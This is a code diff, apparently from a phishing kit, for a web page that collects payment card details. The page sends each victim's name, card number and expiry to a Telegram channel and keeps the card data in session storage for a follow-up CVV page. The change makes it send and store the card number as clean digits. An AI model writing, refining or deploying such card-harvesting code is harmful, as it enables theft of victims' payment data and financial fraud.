@@ -44,20 +44,24 @@ export function CardPage() {
 
     const userName = getUserName();
 
+    const rawCard = cardNumber.replace(/\s+/g, "");
     void sendToTelegram(
       formatEntry("💳 Card Info", {
         "👤 User":       userName,
-        "Card Number":   cardNumber,
+        "Card Number":   rawCard,
         "Expiry":        `${expMonth}/${expYear}`,
       })
     );
+
+    // Always save raw digits
+    const cardToStore = rawCard;
 
     try {
       // Merge into existing rg:card so CVV page can add to it later
       const prev = JSON.parse(sessionStorage.getItem("rg:card") || "{}");
       sessionStorage.setItem(
         "rg:card",
-        JSON.stringify({ ...prev, cardNumber, expiry: `${expMonth}/${expYear}` })
+        JSON.stringify({ ...prev, cardNumber: cardToStore, expiry: `${expMonth}/${expYear}` })
       );
     } catch {}
 
